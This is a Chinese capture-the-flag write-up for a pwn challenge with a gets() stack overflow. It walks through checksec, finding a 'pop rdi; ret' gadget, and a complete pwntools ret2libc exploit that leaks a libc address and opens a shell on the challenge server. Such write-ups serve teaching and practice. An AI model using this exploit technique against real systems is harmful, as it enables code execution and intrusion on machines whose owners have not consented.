---
tags:
  - CTF
  - 题目
---
## 题目描述

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi

  setvbuf(stdin, 0, 1, 0);
  v3 = stdout;
  setvbuf(stdout, 0, 2, 0);
  welcome(v3);
  return 0;
}
```

```cpp
int welcome()
{
  char s[12]; // [rsp+4h] [rbp-Ch] BYREF

  gets(s);
  return puts(s);
}
```

```bash
(temp) nullsky@Shader:~/Workspaces/temp$ pwn checksec pwn
[*] '/home/nullsky/Workspaces/temp/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
## 解题过程


> [!caution] 注意
> 在x64平台，通常参数通过寄存器来传递

由于参数通过寄存器来传递，这意味着我们想传递参数给 `puts` ，不能只靠栈。
由于没有后门函数，我们不得不 ret2libc，但是，我们要怎么给 `puts` 传参以打印出 re2libc 的函数地址呢？
我们需要这么一个 gadget：
```asm
pop rdi
ret
```

可以使用工具 `ROPgadget` 来找：
```bash
(temp) nullsky@Shader:~/Workspaces/temp$ uv run ROPgadget --binary ./pwn --only "pop|ret"
Gadgets information
============================================================
0x00000000004006dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006e0 : pop r14 ; pop r15 ; ret
0x00000000004006e2 : pop r15 ; ret
0x00000000004006db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006df : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400578 : pop rbp ; ret
0x00000000004006e3 : pop rdi ; ret
0x00000000004006e1 : pop rsi ; pop r15 ; ret
0x00000000004006dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004c6 : ret

Unique gadgets found: 11
```

`0x00000000004006e3` 完美符合我们的要求

`exploit.py`
```python
    from pwn import *
    from LibcSearcher import *

    context.arch = 'amd64'
    context.log_level = 'debug'

    elf = ELF("./pwn")
    # p = process(['./pwn'])
    p = remote('pwn.challenge.ctf.show', 28149)

    # --- 第一阶段：泄露地址 ---
    pop_rdi_addr = 0x4006e3
    ret_addr = 0x4004c6 # 找一个单纯的 ret 修正栈对齐
    libc_start_main_got = elf.got['__libc_start_main']
    puts_plt = elf.plt["puts"]
    welcome_addr = elf.symbols["welcome"]

    payload1 = flat([
        b"A" * 20,
        pop_rdi_addr, libc_start_main_got,
        puts_plt,
        welcome_addr
    ])

    p.sendline(payload1)
    p.recvline() # 跳过回显
    leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
    print(f"[*] Leaked libc_start_main: {hex(leak_addr)}")

    # --- 第二阶段：计算偏移 ---
    # 如果是远程比赛，用 LibcSearcher
    libc = LibcSearcher('__libc_start_main', leak_addr)
    libc_base = leak_addr - libc.dump('__libc_start_main')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    # 如果是本地调试，LibcSearcher 有时会抽风，可以换成：
    # libc = elf.libc 
    # libc_base = leak_addr - libc.symbols['__libc_start_main']
    # system_addr = libc_base + libc.symbols['system']
    # bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

    print(f"[*] Libc Base: {hex(libc_base)}")
    print(f"[*] System Addr: {hex(system_addr)}")

    # --- 第三阶段：Gets Shell ---
    # 注意：64位系统调用 system 有一个“16字节对齐”的大坑
    # 如果不加 ret_addr 崩了，就加上它
    payload2 = flat([
        b"A" * 20,
        ret_addr,       # 这一行是灵魂：为了让栈对齐，防止 system 崩溃
        pop_rdi_addr,
        bin_sh_addr,
        system_addr
    ])

    p.sendline(payload2)
    p.interactive()
```